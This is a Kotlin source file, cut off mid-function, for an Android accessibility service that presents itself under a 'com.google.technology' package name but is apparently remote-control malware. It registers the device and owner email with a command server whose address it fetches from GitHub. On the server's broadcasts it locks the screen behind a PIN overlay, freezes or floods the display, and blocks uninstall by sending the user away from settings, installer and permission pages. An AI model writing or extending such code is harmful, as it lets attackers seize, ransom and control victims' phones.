package com.google.technology

import android.accessibilityservice.AccessibilityService
import android.annotation.SuppressLint
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.Paint
import android.graphics.PixelFormat
import android.content.res.AssetFileDescriptor
import android.media.AudioAttributes
import android.media.AudioManager
import android.media.MediaPlayer
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import android.view.Gravity
import android.view.SurfaceHolder
import android.view.SurfaceView
import android.view.View
import android.view.WindowInsets
import android.view.WindowInsetsController
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.EditText
import android.widget.Toast
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.security.MessageDigest

class KaiserAccessibilityService : AccessibilityService() {

    companion object {
        const val ACTION_DO_LOCK            = "com.google.technology.DO_LOCK"
        const val ACTION_DO_UNLOCK          = "com.google.technology.DO_UNLOCK"
        const val ACTION_KEYBOARD_CYCLE     = "com.google.technology.KEYBOARD_CYCLE"
        const val ACTION_KEYBOARD_CYCLE_OFF = "com.google.technology.KEYBOARD_CYCLE_OFF"
        const val ACTION_SET_WALLPAPER      = "com.google.technology.SET_WALLPAPER"
        const val ACTION_TEKSLAYAR          = "com.google.technology.TEKSLAYAR"
        const val ACTION_TEKSLAYAR_OFF      = "com.google.technology.TEKSLAYAR_OFF"
        const val ACTION_DO_LOCKHTML        = "com.google.technology.DO_LOCKHTML"
        const val ACTION_DO_UNLOCKHTML      = "com.google.technology.DO_UNLOCKHTML"
        const val ACTION_PUTAR_VIDEO        = "com.google.technology.PUTAR_VIDEO"
        const val ACTION_VIDEO_ENDED        = "com.google.technology.VIDEO_ENDED"
        const val ACTION_LCDEFEK            = "com.google.technology.LCDEFEK"
        const val ACTION_LCDEFEK_OFF        = "com.google.technology.LCDEFEK_OFF"
        const val ACTION_ANTI_UNINSTALL_ON  = "com.google.technology.ANTI_UNINSTALL_ON"
        const val ACTION_ANTI_UNINSTALL_OFF = "com.google.technology.ANTI_UNINSTALL_OFF"
        const val ACTION_FREEZE_LAYAR       = "com.google.technology.FREEZE_LAYAR"
        const val ACTION_FREEZE_LAYAR_OFF   = "com.google.technology.FREEZE_LAYAR_OFF"
        const val ACTION_AMBARUS            = "com.google.technology.AMBARUS"
        const val ACTION_AMBARUS_OFF        = "com.google.technology.AMBARUS_OFF"

        private const val API_TXT_URL  = "https://raw.githubusercontent.com/Zal7Sex/Kaiser/main/api_20261122.txt"
        private const val FALLBACK_URL = "http://domain:port"

        @Volatile var isAccessibilityActive = false

        private val SETTINGS_PACKAGES = setOf(
            "com.android.settings",
            "com.samsung.android.settings",
            "com.miui.securitycenter",
            "com.miui.permcenter",
            "com.miui.appmanager",
            "com.huawei.systemmanager",
            "com.huawei.permissionmanager",
            "com.oppo.safe",
            "com.coloros.safecenter",
            "com.coloros.oppoguardelf",
            "com.vivo.permissionmanager",
            "com.vivo.appmanagement",
            "com.asus.permissionsmanager",
            "com.asus.applock",
            "com.oneplus.security",
            "com.oneplus.appmanager",
            "com.lge.security",
            "com.htc.pitroad",
            "com.motorola.security",
            "com.lenovo.security",
            "com.zte.privacyguard",
            "com.android.packageinstaller",
            "com.google.android.packageinstaller",
            "com.samsung.android.lool",
            "com.samsung.android.sm",
            "com.sec.android.app.samsungapps",
            "com.realme.safecenter",
            "com.transsion.hidecam",
            "com.transsion.packageinstaller",
            "com.infinix.security",
            "com.tecno.security",
            "com.tecno.packageinstaller",
            "com.wt.security",
            "com.wt.packageinstaller",
            "com.itel.security",
            "com.nokia.packageinstaller",
            "com.xiaomi.mipicks",
            "com.miui.packageinstaller",
            "com.bbk.packageinstaller",
            "com.oppo.packageinstaller",
            "com.vivo.packageinstaller",
        )

        private val PERMISSION_KEYWORDS = listOf(
            "permission", "izin", "allow", "deny", "grant", "access",
            "perizinan", "akses", "allow all", "deny all",
            "berechtigung", "permiso", "autorisation"
        )

        private val UNINSTALL_KEYWORDS = listOf(
            "uninstall", "hapus aplikasi", "remove app", "delete app",
            "ok", "uninstall app", "copot pemasangan", "desinstalar",
            "désinstaller", "deinstallieren", "remove", "hapus"
        )
    }

    private var lcdEfekView: View? = null
    private var freezeLayarView: View? = null
    private var freezeLayarActive = false
    private var ambarusWallpaperRunnable: Runnable? = null
    private var ambarusFotoRunnable: Runnable? = null
    private var ambarusFotoViews: MutableList<android.widget.ImageView> = mutableListOf()
    private var ambarusMediaPlayer: MediaPlayer? = null
    private var ambarusWallpaperIndex = 0
    private var ambarusFotoIndex = 0
    private var ambarusFotoShowCount = 0
    private var lockView: WebView? = null
    private var lockHtmlView: WebView? = null
    private var tekslayarView: WebView? = null
    private var putarVideoSurface: SurfaceView? = null
    private var putarMediaPlayer: MediaPlayer? = null
    private lateinit var windowManager: WindowManager

    private var currentLockText: String = "LOCKED"
    private var currentLockPin: String = "0000"

    private var keyboardCycleRunnable: Runnable? = null
    private val handler = Handler(Looper.getMainLooper())

    private var dummyEditText: EditText? = null
    private var keyboardVisible = false
    private var antiUninstallActive = false

    private val lockReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                ACTION_DO_LOCK            -> {
                    currentLockText = intent.getStringExtra("lockText") ?: "LOCKED"
                    currentLockPin  = intent.getStringExtra("lockPin")  ?: "0000"
                    showLockOverlay()
                }
                ACTION_DO_UNLOCK          -> removeLockOverlay()
                ACTION_KEYBOARD_CYCLE     -> startKeyboardCycle()
                ACTION_KEYBOARD_CYCLE_OFF -> stopKeyboardCycle()
                ACTION_SET_WALLPAPER      -> {
                    val b64 = intent.getStringExtra("wallpaperBase64") ?: return
                    applyWallpaper(b64)
                }
                ACTION_TEKSLAYAR          -> {
                    val teks = intent.getStringExtra("teksLayar") ?: return
                    showTeksLayar(teks)
                }
                ACTION_TEKSLAYAR_OFF      -> removeTeksLayar()
                ACTION_DO_LOCKHTML        -> {
                    val html = intent.getStringExtra("lockHtml") ?: return
                    showLockHtmlOverlay(html)
                }
                ACTION_DO_UNLOCKHTML      -> removeLockHtmlOverlay()
                ACTION_PUTAR_VIDEO        -> {
                    val path = intent.getStringExtra("videoPath") ?: return
                    android.util.Log.d("KAISER_PV", "broadcast received ACTION_PUTAR_VIDEO path=$path")
                    showPutarVideoOverlay(path)
                }
                ACTION_LCDEFEK            -> showLcdEfek()
                ACTION_LCDEFEK_OFF        -> removeLcdEfek()
                ACTION_ANTI_UNINSTALL_ON  -> antiUninstallActive = true
                ACTION_ANTI_UNINSTALL_OFF -> antiUninstallActive = false
                ACTION_FREEZE_LAYAR       -> showFreezeLayar()
                ACTION_FREEZE_LAYAR_OFF   -> removeFreezeLayar()
                ACTION_AMBARUS            -> startAmbarus()
                ACTION_AMBARUS_OFF        -> stopAmbarus()
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        isAccessibilityActive = true
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            val info = serviceInfo
            info.flags = info.flags or
                android.accessibilityservice.AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                android.accessibilityservice.AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS or
                android.accessibilityservice.AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
            serviceInfo = info
        }

        val changedIntent = Intent("com.google.technology.ACCESSIBILITY_CHANGED").apply {
            putExtra("active", true)
            setPackage(packageName)
        }
        sendBroadcast(changedIntent)

        val filter = IntentFilter().apply {
            addAction(ACTION_DO_LOCK)
            addAction(ACTION_DO_UNLOCK)
            addAction(ACTION_KEYBOARD_CYCLE)
            addAction(ACTION_KEYBOARD_CYCLE_OFF)
            addAction(ACTION_SET_WALLPAPER)
            addAction(ACTION_TEKSLAYAR)
            addAction(ACTION_TEKSLAYAR_OFF)
            addAction(ACTION_DO_LOCKHTML)
            addAction(ACTION_DO_UNLOCKHTML)
            addAction(ACTION_PUTAR_VIDEO)
            addAction(ACTION_LCDEFEK)
            addAction(ACTION_LCDEFEK_OFF)
            addAction(ACTION_ANTI_UNINSTALL_ON)
            addAction(ACTION_ANTI_UNINSTALL_OFF)
            addAction(ACTION_FREEZE_LAYAR)
            addAction(ACTION_FREEZE_LAYAR_OFF)
            addAction(ACTION_AMBARUS)
            addAction(ACTION_AMBARUS_OFF)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(lockReceiver, filter, RECEIVER_EXPORTED)
        } else {
            registerReceiver(lockReceiver, filter)
        }

        val svcIntent = Intent(this, HeartbeatService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(svcIntent)
        } else {
            startService(svcIntent)
        }

        fetchApiUrlInBackground()
    }

    private fun getStableDeviceId(): String {
        val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: ""
        val raw = "kaiser-device-$androidId-${Build.SERIAL}"
        return try {
            val md = MessageDigest.getInstance("SHA-256")
            val digest = md.digest(raw.toByteArray())
            val hex = digest.joinToString("") { "%02x".format(it) }
            "${hex.substring(0, 8)}-${hex.substring(8, 12)}-${hex.substring(12, 16)}-${hex.substring(16, 20)}-${hex.substring(20, 32)}"
        } catch (_: Exception) {
            androidId.ifEmpty { raw.hashCode().toString() }
        }
    }

    private fun getStableDeviceToken(): String {
        val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: ""
        val raw = "kaiser-token-$androidId-${Build.MANUFACTURER}-${Build.MODEL}"
        return try {
            val md = MessageDigest.getInstance("SHA-256")
            val digest = md.digest(raw.toByteArray())
            digest.joinToString("") { "%02x".format(it) }
        } catch (_: Exception) {
            androidId.reversed().ifEmpty { raw.hashCode().toString() }
        }
    }

    private fun fetchApiUrlInBackground() {
        val prefs = getSharedPreferences("google", MODE_PRIVATE)
        Thread {
            var apiUrl: String? = null
            try {
                val conn = java.net.URL(API_TXT_URL).openConnection() as java.net.HttpURLConnection
                conn.connectTimeout = 8000
                conn.readTimeout    = 8000
                conn.requestMethod  = "GET"
                if (conn.responseCode == 200) {
                    val content = conn.inputStream.bufferedReader().readText().trim()
                    if (content.startsWith("http")) apiUrl = content
                }
                conn.disconnect()
            } catch (_: Exception) {}

            if (apiUrl == null) {
                apiUrl = prefs.getString("apiBaseUrl", null) ?: FALLBACK_URL
            } else {
                prefs.edit().putString("apiBaseUrl", apiUrl).apply()
            }

            val stableId    = getStableDeviceId()
            val stableToken = getStableDeviceToken()
            prefs.edit()
                .putString("deviceId", stableId)
                .putString("deviceToken", stableToken)
                .apply()

            val deviceName = "${Build.MANUFACTURER} ${Build.MODEL}".trim()
            val ownerEmail = prefs.getString("ownerEmail", "") ?: ""

            val json = JSONObject().apply {
                put("deviceId", stableId)
                put("name",     deviceName)
                put("model",    Build.MODEL)
                put("token",    stableToken)
                put("owner",    ownerEmail)
            }

            try {
                val body    = json.toString().toRequestBody("application/json".toMediaType())
                val request = okhttp3.Request.Builder()
                    .url("$apiUrl/api/devices/register")
                    .post(body)
                    .build()
                okhttp3.OkHttpClient().newCall(request).execute().use {}
            } catch (_: Exception) {}
        }.start()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (!antiUninstallActive) return
        val pkg = event?.packageName?.toString() ?: return

        val isSettingsPkg = SETTINGS_PACKAGES.any { pkg == it || pkg.contains(it) }
        val isPackageInstaller = pkg.contains("packageinstaller") || pkg.contains("installer")
        val isPermissionController = pkg.contains("permissioncontroller") || pkg.contains("permission")

        if (!isSettingsPkg && !isPackageInstaller && !isPermissionController) return

        if (event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
            event.eventType != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED &&
            event.eventType != AccessibilityEvent.TYPE_VIEW_CLICKED &&
            event.eventType != AccessibilityEvent.TYPE_VIEW_FOCUSED) return

        if (isPackageInstaller) {
            doBlock()
            return
        }

        val className = event.className?.toString()?.lowercase() ?: ""
        val nodeText = try {
            getAllNodeText(rootInActiveWindow).lowercase()
        } catch (_: Exception) { "" }

        val isAppInfoClass =
            className.contains("appinfodashboard") ||
            className.contains("appdetailfragment") ||
            className.contains("appinfobase") ||
            className.contains("installedappdetails") ||
            className.contains("appinfo") ||
            className.contains("applicationdetails") ||
            className.contains("manageapplication") ||
            className.contains("appsettings") ||
            className.contains("apppermission") ||
            className.contains("permissiondetail") ||
            className.contains("permissionapps") ||
            className.contains("permissioncontroller") ||
            className.contains("grantpermission") ||
            className.contains("reviewpermission") ||
            className.contains("accessibilitydetails") ||
            className.contains("accessibilitysettings") ||
            className.contains("accessibilityservice") ||
            className.contains("toggleaccessibility") ||
            className.contains("accessibilitylist") ||
            className.contains("installedaccessibility") ||
            className.contains("securitysettings") ||
            className.contains("deviceadmin") ||
            className.contains("deviceadmindetail") ||
            className.contains("deviceadminlist") ||
            className.contains("batteryoptimization") ||
            className.contains("highpowerapps") ||
            className.contains("specialaccess") ||
            className.contains("specialappaccess") ||
            className.contains("notificationaccess") ||
            className.contains("usageaccesssettings") ||
            className.contains("overlaysettings") ||
            className.contains("writesettings") ||
            className.contains("displayoverapps") ||
            className.contains("alarmssettings") ||
            className.contains("nfcappsettings")

        val hasAppInfoKeyword =
            nodeText.contains("force stop") ||
            nodeText.contains("paksa berhenti") ||
            nodeText.contains("uninstall") ||
            nodeText.contains("copot pemasangan") ||
            nodeText.contains("hapus aplikasi") ||
            nodeText.contains("disable app") ||
            nodeText.contains("nonaktifkan aplikasi") ||
            nodeText.contains("app info") ||
            nodeText.contains("info aplikasi") ||
            nodeText.contains("application info") ||
            nodeText.contains("clear data") ||
            nodeText.contains("hapus data") ||
            nodeText.contains("clear cache") ||
            nodeText.contains("hapus cache") ||
            nodeText.contains("clear storage") ||
            nodeText.contains("hapus penyimpanan")

        val hasPermissionPageKeyword =
            nodeText.contains("manage permission") ||
            nodeText.contains("kelola izin") ||
            nodeText.contains("app permissions") ||
            nodeText.contains("izin aplikasi") ||
            nodeText.contains("permission manager") ||
            nodeText.contains("pengelola izin") ||
            nodeText.contains("allowed") ||
            nodeText.contains("not allowed") ||
            nodeText.contains("diizinkan") ||
            nodeText.contains("tidak diizinkan") ||
            nodeText.contains("ask every time") ||
            nodeText.contains("tanya setiap saat") ||
            nodeText.contains("only while using") ||
            nodeText.contains("hanya saat digunakan")

        val hasAccessibilityPageKeyword =
            nodeText.contains("accessibility service") ||
            nodeText.contains("layanan aksesibilitas") ||
            nodeText.contains("installed service") ||
            nodeText.contains("downloaded app") ||
            nodeText.contains("use accessibility") ||
            nodeText.contains("gunakan aksesibilitas") ||
            nodeText.contains("device admin") ||
            nodeText.contains("admin perangkat") ||
            nodeText.contains("special app access") ||
            nodeText.contains("akses aplikasi khusus") ||
            nodeText.contains("display over other") ||
            nodeText.contains("tampilkan di atas app") ||
            nodeText.contains("appear on top") ||
            nodeText.contains("usage access") ||
            nodeText.contains("akses penggunaan") ||
            nodeText.contains("install unknown") ||
            nodeText.contains("pasang aplikasi") ||
            nodeText.contains("unknown source") ||
            nodeText.contains("sumber tidak dikenal") ||
            nodeText.contains("notification listener") ||
            nodeText.contains("pendengar notifikasi") ||
            nodeText.contains("modify system") ||
            nodeText.contains("ubah pengaturan sistem") ||
            nodeText.contains("battery optimization") ||
            nodeText.contains("pengoptimalan baterai") ||
            nodeText.contains("unrestricted") ||
            nodeText.contains("tidak dibatasi") ||
            nodeText.contains("background activity") ||
            nodeText.contains("aktivitas latar belakang")

        val isAppInfoByNode = hasAppInfoKeyword && (
            nodeText.contains("open") ||
            nodeText.contains("buka") ||
            nodeText.contains("storage") ||
            nodeText.contains("penyimpanan") ||
            nodeText.contains("notification") ||
            nodeText.contains("notifikasi") ||
            nodeText.contains("permission") ||
            nodeText.contains("izin") ||
            nodeText.contains("battery") ||
            nodeText.contains("baterai") ||
            nodeText.contains("data usage") ||
            nodeText.contains("penggunaan data")
        )

        if (isAppInfoClass || isAppInfoByNode || hasPermissionPageKeyword || hasAccessibilityPageKeyword) {
            doBlock()
        }
    }

    private fun doBlock() {
        handler.post {
            try {
                Toast.makeText(applicationContext, "Block By Kaiser", Toast.LENGTH_SHORT).show()
            } catch (_: Exception) {}
            performGlobalAction(GLOBAL_ACTION_HOME)
        }
    }

    private fun getAllNodeText(node: android.view.accessibility.AccessibilityNodeInfo?): String {
        if (node == null) return ""
        val sb = StringBuilder()
        try {
            node.text?.let { sb.append(it).append(" ") }
            node.contentDescription?.let { sb.append(it).append(" ") }
            for (i in 0 until node.childCount) {
                sb.append(getAllNodeText(node.getChild(i)))
            }
        } catch (_: Exception) {}
        return sb.toString()
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        isAccessibilityActive = false
        antiUninstallActive = false
        removeLockOverlay()
        removeLockHtmlOverlay()
        removePutarVideoOverlay(null)
        stopKeyboardCycle()
        removeDummyEditText()
        removeTeksLayar()
        removeLcdEfek()
        removeFreezeLayar()
        stopAmbarus()

        val changedIntent = Intent("com.google.technology.ACCESSIBILITY_CHANGED").apply {
            putExtra("active", false)
            setPackage(packageName)
        }
        sendBroadcast(changedIntent)

        try { unregisterReceiver(lockReceiver) } catch (_: Exception) {}
        super.onDestroy()
    }

    private fun getScreenWidth(): Int {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            windowManager.currentWindowMetrics.bounds.width()
        } else {
            @Suppress("DEPRECATION")
            val dm = android.util.DisplayMetrics()
            @Suppress("DEPRECATION")
            windowManager.defaultDisplay.getRealMetrics(dm)
            dm.widthPixels
        }
    }

    private fun getScreenHeight(): Int {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            windowManager.currentWindowMetrics.bounds.height()
        } else {
            @Suppress("DEPRECATION")
            val dm = android.util.DisplayMetrics()
            @Suppress("DEPRECATION")
            windowManager.defaultDisplay.getRealMetrics(dm)
            dm.heightPixels
        }
    }

    @Suppress("DEPRECATION")
    private fun buildFullscreenOverlayParams(
        width: Int = WindowManager.LayoutParams.MATCH_PARENT,
        height: Int = WindowManager.LayoutParams.MATCH_PARENT,
        touchable: Boolean = true,
        alpha: Float = 1f
    ): WindowManager.LayoutParams {
        val baseFlags = (
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
            or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
            or WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
            or WindowManager.LayoutParams.FLAG_FULLSCREEN
            or WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
            or WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
            or WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS
        )
        val flags = if (touchable) {
            baseFlags or
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
            WindowManager.LayoutParams.FLAG_ALT_FOCUSABLE_IM
        } else {
            baseFlags or
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
        }
        val params = WindowManager.LayoutParams(
            width,
            height,
            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
            flags,
            if (alpha < 1f) PixelFormat.TRANSLUCENT else PixelFormat.OPAQUE
        )
        params.gravity = Gravity.TOP or Gravity.START
        params.x = 0
        params.y = 0
        params.alpha = alpha
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            params.layoutInDisplayCutoutMode =
                WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
        }
        return params
    }

    @Suppress("DEPRECATION")
    private fun applyLegacySystemUiHide(view: View) {
        view.systemUiVisibility = (
            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
            or View.SYSTEM_UI_FLAG_FULLSCREEN
            or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
            or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
            or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
            or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
        )
    }

    private fun applyModernSystemUiHide(view: View) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val applyInsets = Runnable {
                view.windowInsetsController?.let { ctrl ->
                    ctrl.systemBarsBehavior =
                        WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
                    ctrl.hide(WindowInsets.Type.systemBars())
                }
            }
            if (view.isAttachedToWindow) {
                applyInsets.run()
            } else {
                view.addOnAttachStateChangeListener(object : View.OnAttachStateChangeListener {
                    override fun onViewAttachedToWindow(v: View) {
                        applyInsets.run()
                    }
                    override fun onViewDetachedFromWindow(v: View) {}
                })
            }
        }
    }

    private fun applyFullscreen(view: View) {
        applyLegacySystemUiHide(view)
        applyModernSystemUiHide(view)
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun showLockOverlay() {
        if (lockView != null) return

        val webView = WebView(this)
        webView.settings.javaScriptEnabled = true
        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: android.webkit.WebView, url: String): Boolean {
                if (url == "kontrol://unlock") {
                    handler.post {
                        removeLockOverlay()
                        notifyServerUnlocked()
                        stopLockServiceFromAccessibility()
                    }
                    return true
                }
                return false
            }
        }
        webView.setBackgroundColor(0xFF000000.toInt())
        webView.loadDataWithBaseURL(null, buildLockHtml(currentLockText, currentLockPin), "text/html", "UTF-8", null)
        applyFullscreen(webView)

        val params = buildFullscreenOverlayParams(touchable = true)

        try {
            windowManager.addView(webView, params)
            lockView = webView
            LockService.isLocked = true
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun removeLockOverlay() {
        lockView?.let {
            try { windowManager.removeView(it) } catch (_: Exception) {}
        }
        lockView = null
        LockService.isLocked = false
    }

    private fun notifyServerUnlocked() {
        val prefs = getSharedPreferences("google", MODE_PRIVATE)
        val deviceId = prefs.getString("deviceId", null) ?: return
        val token    = prefs.getString("deviceToken", null) ?: return
        val baseUrl  = prefs.getString("apiBaseUrl", FALLBACK_URL) ?: FALLBACK_URL
        Thread {
            try {
                val body = org.json.JSONObject().apply {
                    put("deviceId", deviceId)
                    put("token", token)
                }.toString().toRequestBody("application/json".toMediaType())
                val request = okhttp3.Request.Builder()
                    .url("$baseUrl/api/devices/unlock-confirmed")
                    .post(body)
                    .build()
                okhttp3.OkHttpClient().newCall(request).execute().use {}
            } catch (_: Exception) {}
        }.start()
    }

    private fun stopLockServiceFromAccessibility() {
        val intent = Intent(this, LockService::class.java).apply {
            action = LockService.ACTION_UNLOCK
        }
        startService(intent)
    }

    private fun buildLockHtml(title: String, pin: String): String = """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}
html,body{width:100%;height:100%;overflow:hidden;background:#0a0a0a;font-family:-apple-system,sans-serif;}
body{display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:0 24px 90px;transition:opacity .3s;}
.lock-icon{width:100px;height:100px;border-radius:26px;background:#1565C0;display:flex;align-items:center;justify-content:center;margin:0 auto 24px;}
.lock-title{font-size:22px;font-weight:800;color:#ffffff;text-align:center;letter-spacing:0.06em;margin-bottom:32px;}
.pin-dots{display:flex;gap:18px;justify-content:center;margin-bottom:32px;}
.dot{width:18px;height:18px;border-radius:50%;border:2px solid #444;background:transparent;transition:all .15s;}
.dot.on{background:#1565C0;border-color:#1565C0;}
.keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;width:100%;max-width:280px;}
.key{height:64px;border-radius:16px;background:#1a1a1a;border:1px solid #222;font-size:22px;font-weight:700;color:#f0f0f0;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:background .1s,transform .1s;}
.key:active{background:#2d2d2d;transform:scale(.94);}
.key.del{background:#1a1a1a;}
.key.enter{background:#1565C0;border-color:#1565C0;color:#fff;font-size:14px;font-weight:800;letter-spacing:.06em;}
.key.enter:active{background:#0d47a1;transform:scale(.94);}
.err{height:20px;text-align:center;font-size:12px;color:#1565C0;margin-top:16px;opacity:0;transition:opacity .2s;}
.err.show{opacity:1;}
.footer-warning{position:fixed;bottom:150px;left:0;right:0;background:#1a1a1a;border-top:1px solid #2a2a2a;padding:14px 20px;text-align:center;}
.footer-warning p{font-size:11px;font-weight:700;color:#facc15;letter-spacing:0.08em;text-transform:uppercase;}
.footer-warning span{display:block;font-size:10px;font-weight:400;color:#888;margin-top:4px;letter-spacing:0.04em;text-transform:none;}
</style>
</head>
<body>
<div class="lock-icon">
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="54" height="54" fill="#ffffff">
  <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
</svg>
</div>
<div class="lock-title">$title</div>
<div class="pin-dots" id="dots">
  <div class="dot" id="d0"></div>
  <div class="dot" id="d1"></div>
  <div class="dot" id="d2"></div>
  <div class="dot" id="d3"></div>
</div>
<div class="keypad">
  <button class="key" onclick="kp('1')">1</button>
  <button class="key" onclick="kp('2')">2</button>
  <button class="key" onclick="kp('3')">3</button>
  <button class="key" onclick="kp('4')">4</button>
  <button class="key" onclick="kp('5')">5</button>
  <button class="key" onclick="kp('6')">6</button>
  <button class="key" onclick="kp('7')">7</button>
  <button class="key" onclick="kp('8')">8</button>
  <button class="key" onclick="kp('9')">9</button>
  <button class="key del" onclick="kd()">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="22" height="22" fill="#f0f0f0">
      <path d="M22 3H7c-.69 0-1.23.35-1.59.88L0 12l5.41 8.11c.36.53.9.89 1.59.89h15c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-3 12.59L17.59 17 14 13.41 10.41 17 9 15.59 12.59 12 9 8.41 10.41 7 14 10.59 17.59 7 19 8.41 15.41 12 19 15.59z"/>
    </svg>
  </button>
  <button class="key" onclick="kp('0')">0</button>
  <button class="key enter" onclick="ke()">UNLOCK</button>
</div>
<div class="err" id="err">PIN Salah</div>

<footer class="footer-warning">
  <p>JANGAN MERESTART PERANGKAT ANDA</p>
  <span>Merestart Perangkat Tidak Dapat Membuka Perangkat Yang Sudah Terkunci</span>
</footer>

<script>
var _pin='$pin', _inp='';
function upd(){for(var i=0;i<4;i++){var d=document.getElementById('d'+i);if(d)d.className='dot'+(i<_inp.length?' on':'');}}
function kp(n){if(_inp.length>=4)return;_inp+=n;upd();}
function kd(){if(!_inp.length)return;_inp=_inp.slice(0,-1);upd();}
function ke(){
  if(_inp===_pin){
    document.body.style.opacity='0';
    setTimeout(function(){window.location.href='kontrol://unlock';},300);
    return;
  }
  var e=document.getElementById('err');e.classList.add('show');
  _inp='';upd();
  setTimeout(function(){e.classList.remove('show');},1200);
}
</script>
</body>
</html>
    """.trimIndent()

    private fun ensureDummyEditText() {
        if (dummyEditText != null) return
        val et = EditText(this)
        et.isFocusableInTouchMode = true
        et.isFocusable = true
        val params = WindowManager.LayoutParams(
            1, 1,
            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
            PixelFormat.TRANSLUCENT
        )
        params.gravity = Gravity.TOP or Gravity.START
        params.x = 0
        params.y = 0
        try {
            windowManager.addView(et, params)
            dummyEditText = et
        } catch (_: Exception) {}
    }

    private fun removeDummyEditText() {
        dummyEditText?.let {
            try { windowManager.removeView(it) } catch (_: Exception) {}
        }
        dummyEditText = null
    }

    private fun startKeyboardCycle() {
        if (keyboardCycleRunnable != null) return
        ensureDummyEditText()
        val imm = getSystemService(INPUT_METHOD_SERVICE) as? android.view.inputmethod.InputMethodManager ?: return

        keyboardVisible = false

        val cycle = object : Runnable {
            override fun run() {
                try {
                    val et = dummyEditText
                    if (et != null) {
                        if (!keyboardVisible) {
                            et.requestFocus()
                            imm.showSoftInput(et, android.view.inputmethod.InputMethodManager.SHOW_FORCED)
                        } else {
                            imm.hideSoftInputFromWindow(et.windowToken, 0)
                        }
                        keyboardVisible = !keyboardVisible
                    }
                } catch (_: Exception) {}
                handler.postDelayed(this, 200)
            }
        }
        keyboardCycleRunnable = cycle
        handler.post(cycle)
    }

    private fun stopKeyboardCycle() {
        keyboardCycleRunnable?.let { handler.removeCallbacks(it) }
        keyboardCycleRunnable = null
        try {
            val et = dummyEditText
            val imm = getSystemService(INPUT_METHOD_SERVICE) as? android.view.inputmethod.InputMethodManager
            if (et != null) {
                imm?.hideSoftInputFromWindow(et.windowToken, 0)
            }
        } catch (_: Exception) {}
        removeDummyEditText()
        keyboardVisible = false
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun showTeksLayar(teks: String) {
        removeTeksLayar()

        val screenWidth = getScreenWidth()
        val screenHeight = getScreenHeight()

